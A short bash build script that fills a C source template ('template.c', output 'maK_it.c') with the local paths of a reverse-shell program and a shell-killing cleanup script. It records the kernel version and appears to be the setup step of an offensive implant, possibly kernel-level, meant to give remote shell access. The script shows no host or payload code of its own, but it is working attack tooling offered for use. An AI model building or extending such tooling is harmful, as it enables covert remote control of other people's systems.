#!/bin/bash

KERN=$(uname -r)
IN="template.c"
OUT="maK_it.c"
BREAK="----------------------------"

echo ""
#Templates to be replaced
WHERE=$(pwd)"/shells/revshell"
WHERE2=$(pwd)"/scripts/kill_shell.sh"
ESC_SHELL=$(echo $WHERE | sed -e 's/\//\\\//g')
ESC_CLEAN=$(echo $WHERE2 | sed -e 's/\//\\\//g')
SHELL_TMP="SHELL_TEMPLATE"
CLEAN_TMP="CLEAN_TEMPLATE"

echo "Adding reverse shell script path to template..."
echo "$WHERE ..."
echo "Adding cleanup script to template..."
echo "$WHERE2 ..."
echo $BREAK
sed -e "s/$SHELL_TMP/$ESC_SHELL/g;s/$CLEAN_TMP/$ESC_CLEAN/g;" < $IN > $OUT


